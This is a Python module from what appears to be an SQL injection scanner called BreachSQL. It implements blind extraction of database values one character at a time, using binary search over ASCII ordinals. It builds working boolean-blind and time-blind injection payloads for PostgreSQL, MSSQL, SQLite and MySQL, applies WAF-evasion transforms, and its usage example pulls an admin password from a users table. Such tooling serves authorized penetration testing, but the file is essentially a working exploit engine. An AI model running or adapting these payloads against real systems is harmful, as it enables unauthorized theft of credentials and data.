# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/extract.py
Blind data extraction using SUBSTRING-based boolean queries.

This module implements character-by-character data extraction over a
confirmed boolean-blind or time-blind SQLi vector.

Approach (binary search over ASCII ordinal):
  For each character position 1..max_len:
    1. Use a boolean-blind query: ASCII(SUBSTRING(expr, pos, 1)) > mid
    2. Binary search narrows the ordinal range from [32, 126] to a single
       printable ASCII character in at most 7 requests.
    3. If the character ordinal is < 32 (non-printable) or > 126, stop
       extraction — we've hit the end of the string.

Supported extraction contexts:
  - Boolean-blind: uses _test_boolean_condition() which reuses the active.py
    _fetch + _diff_score machinery.
  - Time-blind: uses _test_time_condition() via blind.py _timed_fetch.

Usage:
  result = extract_value(
      expr="(SELECT password FROM users WHERE username='admin' LIMIT 1)",
      surface=surface, evasions=evasions, opts=opts,
      injector=injector, baseline=baseline,
      mode="boolean",   # or "time"
  )
  # result is a string like "s3cr3t!" or "" on failure
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

from commonhuman_payloads.sqli import get_extraction_targets  # noqa: F401 (re-exported)
from ..log import get_logger
from ..http.injector import Injector
from ..http.waf_detect import EVASION_NONE
from .options import ScanOptions
from .payloads import apply_evasion
from .active import _fetch, _diff_score, _len_ratio
from .blind import _timed_fetch

logger = get_logger("breachsql.extract")

# Printable ASCII range (space=32 .. tilde=126)
_ASCII_MIN = 32
_ASCII_MAX = 126

# Stop extraction when we see this many consecutive non-printable / null chars
_MAX_NONPRINT_STREAK = 2

# Maximum characters to extract per expression (safety cap)
_MAX_EXTRACT_LEN = 256

# Diff score threshold: same as active.py boolean likely threshold
_DIFF_THRESHOLD = 0.10
_LEN_RATIO_THRESHOLD = 0.02


def extract_value(
    expr: str,
    surface: Dict[str, Any],
    evasions: List[str],
    opts: ScanOptions,
    injector: Injector,
    baseline: str,
    mode: str = "boolean",
) -> str:
    """
    Extract the string result of SQL *expr* character by character.

    *mode* must be ``"boolean"`` (uses response diff) or ``"time"``
    (uses response timing).  Returns the extracted string, which may be
    empty if extraction fails.
    """
    dbms = opts.dbms
    evasion = evasions[0] if evasions else EVASION_NONE

    substr_fn = "SUBSTR" if dbms in ("sqlite", "oracle") else "SUBSTRING"
    ord_fn = "ASCII"

    url        = surface["url"]
    method     = surface["method"]
    params     = surface["params"]
    param      = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)
    second_url = getattr(opts, "second_url", "")

    result_chars: List[str] = []
    nonprint_streak = 0

    for pos in range(1, _MAX_EXTRACT_LEN + 1):
        ordinal = _binary_search_char(
            expr=expr,
            pos=pos,
            substr_fn=substr_fn,
            ord_fn=ord_fn,
            surface=surface,
            evasion=evasion,
            opts=opts,
            injector=injector,
            baseline=baseline,
            mode=mode,
        )
        if ordinal is None:
            # Could not determine the character — extraction stalled
            logger.debug("extract_value: stalled at pos=%d", pos)
            break
        if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
            nonprint_streak += 1
            if nonprint_streak >= _MAX_NONPRINT_STREAK:
                break
            continue

        nonprint_streak = 0
        ch = chr(ordinal)
        result_chars.append(ch)

    return "".join(result_chars)


def _binary_search_char(
    expr: str,
    pos: int,
    substr_fn: str,
    ord_fn: str,
    surface: Dict[str, Any],
    evasion: str,
    opts: ScanOptions,
    injector: Injector,
    baseline: str,
    mode: str,
) -> Optional[int]:
    """
    Binary-search the ASCII ordinal of the character at *pos* in the result
    of SQL *expr*.

    Returns the ordinal integer (0–127) or None if the boolean signal is
    unreliable / the DB returned NULL / end of string.
    """
    url        = surface["url"]
    method     = surface["method"]
    params     = surface["params"]
    param      = surface["single_param"]
    json_body  = surface.get("json_body", False)
    path_index = surface.get("path_index", 0)
    second_url = getattr(opts, "second_url", "")

    lo, hi = 0, _ASCII_MAX + 1  # lo=0 so ASCII('')=0 converges to ordinal 1 (end-of-string)

    while lo + 1 < hi:
        mid = (lo + hi) // 2

        if mode == "time":
            # Time-blind: if condition is true, the delay fires.
            # Use per-DBMS conditional sleep syntax.
            delay = opts.time_threshold
            _dbms = (opts.dbms or "auto").lower()
            if _dbms in ("postgres", "postgresql"):
                # PostgreSQL: CASE WHEN cond THEN pg_sleep(n) END
                time_true_pl = (
                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1-- -"
                )
            elif _dbms == "mssql":
                # MSSQL: WAITFOR DELAY cannot appear inside a SELECT subquery; it
                # requires a stacked (batched) statement.  Use a stacked IF … WAITFOR.
                time_true_pl = (
                    f"'; IF ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" WAITFOR DELAY '0:0:{delay}'-- -"
                )
            elif _dbms == "sqlite":
                # SQLite: randomblob-based busy loop to induce delay when condition is true
                time_true_pl = (
                    f"' AND (CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                    f" THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS"
                    f" (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<1000000) SELECT x FROM r)) ELSE 1 END)=1-- -"
                )
            else:
                # MySQL / MariaDB / auto: OR scalar subquery avoids the missing-row
                # problem — SLEEP fires once even when base record doesn't exist.
                time_true_pl = (
                    f"' OR (SELECT IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}"
                    f",SLEEP({delay}),0))-- -"
                )
            time_true_pl = apply_evasion(time_true_pl, evasion)
            elapsed = _timed_fetch(
                injector, url, method, params, param, time_true_pl,
                second_url=second_url, json_body=json_body, path_index=path_index,
            )
            if elapsed is None:
                return None
            condition_true = elapsed >= opts.time_threshold
        else:
            # Boolean-blind: OR-based single probe compared against baseline.
            # OR fires regardless of whether the base record exists, matching
            # the boolean-detection payloads that confirmed this channel.
            # Condition true  → all rows returned → response differs from baseline.
            # Condition false → no rows (base record absent) → same as baseline.
            probe_payload = f"' OR {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
            probe_pl = apply_evasion(probe_payload, evasion)

            resp_probe = _fetch(injector, url, method, params, param, probe_pl,
                                second_url=second_url, json_body=json_body,
                                path_index=path_index)
            if resp_probe is None:
                return None

            score = _diff_score(resp_probe, baseline)
            len_r = _len_ratio(resp_probe, baseline)
            condition_true = score >= _DIFF_THRESHOLD or len_r >= _LEN_RATIO_THRESHOLD

        if condition_true:
            lo = mid   # ordinal > mid, so search upper half
        else:
            hi = mid   # ordinal <= mid, so search lower half

    ordinal = lo + 1
    if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
        return ordinal  # caller handles out-of-range (end of string / NULL)
    return ordinal
